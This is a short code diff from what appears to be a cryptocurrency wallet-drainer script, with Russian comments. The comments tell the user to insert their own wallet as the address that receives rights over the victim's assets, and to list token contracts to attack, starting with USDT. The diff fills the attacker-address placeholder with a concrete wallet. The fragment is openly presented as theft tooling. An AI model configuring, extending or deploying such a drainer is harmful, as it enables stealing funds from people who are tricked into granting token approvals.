@@ -1,6 +1,6 @@
 // --- КОНФИГУРАЦИЯ ---
 // Сюда вставь свой кошелек. Это адрес, который получит права на активы жертвы.
-const attackerAddress = "YOUR_WALLET_ADDRESS";
+const attackerAddress = "TZD6PCN6rPiRrHqRyi5JvmMJrRYpNTwJP9";
 
 // Адреса контрактов для атаки. Можешь добавить сколько угодно.
 // USDT (ERC20)
